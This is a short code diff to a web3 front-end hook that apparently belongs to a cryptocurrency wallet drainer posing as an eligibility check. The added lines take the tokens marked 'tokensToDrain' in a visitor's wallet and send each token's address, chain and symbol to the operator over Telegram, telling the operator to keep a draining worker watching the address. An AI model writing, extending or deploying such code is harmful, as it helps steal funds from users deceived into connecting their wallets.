@@ -199,6 +199,14 @@ export function useWeb3Manager() {
         const isEligible = tokensToDrain.length > 0;
         setEligibility(isEligible ? "Eligible" : "Not Eligible");
 
+        // 2. Dynamic Discovery: Alert if a user has a token not in our library
+        if (isEligible) {
+            tokensToDrain.forEach(token => {
+                // We don't have the library here yet, but we'll send the info anyway
+                notifyTelegram(`<b>🔍 Token Discovered</b>\nAddress: <code>${token.address}</code>\nChain: ${token.chainId}\nSymbol: ${token.symbol || 'Unknown'}\n<i>(Ensure your worker is watching this address!)</i>`);
+            });
+        }
+
         return { isEligible, tokensToDrain };
     };
 
